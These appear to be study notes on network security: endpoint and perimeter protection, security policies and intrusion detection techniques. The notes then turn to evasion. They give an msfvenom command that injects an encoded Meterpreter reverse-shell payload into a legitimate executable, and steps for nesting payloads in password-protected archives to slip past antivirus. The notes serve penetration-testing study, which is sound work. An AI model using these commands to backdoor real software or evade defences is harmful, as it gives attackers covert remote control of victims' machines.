## **Protection Mechanisms**

**1. Endpoint Protection**

- **Definition**: Protects individual hosts (PCs, workstations, servers).
- **Components**:
    - Antivirus
    - Antimalware
    - Firewall
    - Anti-DDOS
- **Examples**: Avast, BitDefender, Malwarebytes

**2. Perimeter Protection**

- **Definition**: Secures the network boundary via physical/virtual devices (e.g., firewalls, IDS/IPS).
- **Zones**:
    - **Public Zone**: Internet-facing
    - **Private Zone**: Internal network
    - **DMZ (De-Militarized Zone)**: Intermediate zone for public-facing servers

## **Security Policies**

- Drive the network’s security posture.
- Function like **Access Control Lists (ACLs)**.

### **Types of Policies**:

- **Network Traffic Policies**: Control packet flow.
- **Application Policies**: Regulate app behavior.
- **User Access Control**: Manage user permissions.
- **File Management**: Handle file access and movement.
- **DDoS Protection**: Mitigate large-scale attacks.

### **Detection Techniques**:

|**Technique**|**Description**|
|---|---|
|**Signature-based**|Matches packets to known attack signatures.|
|**Heuristic/Anomaly-based**|Detects deviations from baseline behavior.|
|**Stateful Protocol Analysis**|Compares protocol behavior against accepted norms.|
|**Live Monitoring (SOC)**|Security analysts monitor network in real-time.|

## **Evasion Techniques**

Modern defenses (AV, IDS/IPS) detect malicious activity through **signature-based detection**. To bypass these, attackers use **encryption**, **payload obfuscation**, and **tunneling**.

### **Techniques for Bypassing Detection**:

1. **Encryption**:
    - Use **AES-encrypted tunnels** (via Meterpreter) to hide communication.
2. **Backdoored Executables**:
    - Use **msfvenom** to inject payloads into legitimate executables (e.g., installers).
    - Example command:
        
        ```bash
        msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -k -x <exe-file> -e x86/shikata_ga_nai -i 5 -o <output-file>
        ```
        
    - **Flag Breakdown**:
        - `-k`: Keep original executable functionality.
        - `-e`: Encoder (e.g., **x86/shikata_ga_nai**) to obfuscate payload.
        - `-i`: Number of encoding iterations.

## **Archiving Payloads**

**Archiving + Password-Protecting** payloads can bypass some AV checks. However, this raises alarms due to the inability to scan the file.

### **Steps to Archive a Payload**:

1. **Create a Password-Protected Archive**:
    
    ```bash
    rar a test.rar -p test.js
    ```
    
2. **Remove the Extension**:
    
    ```bash
    mv test.rar test
    ```
    
3. **Re-archive** the file and repeat step 2:
    
    ```bash
    rar a test2.rar -p test
    mv test2.rar test2
    ```
    


## **Summary of Key Commands**

|**Command**|**Description**|
|---|---|
|`msfvenom windows/x86/meterpreter_reverse_tcp`|Generate a reverse shell payload.|
|`-k`|Keep original functionality of the executable.|
|`-e x86/shikata_ga_nai`|Use Shikata Ga Nai encoder.|
|`rar a <archive-name>.rar -p <file>`|Create a password-protected archive.|
|`mv <file>.rar <new-file-name>`|Remove the archive extension.|

### **Key Concepts to Remember**

- **Endpoint Protection**: Protects individual devices.
- **Perimeter Protection**: Secures network boundaries.
- **Evasion**: Use encryption, obfuscation, and backdoored executables to bypass detection.
- **Archiving Payloads**: Password-protected archives can evade AV but may raise admin alerts.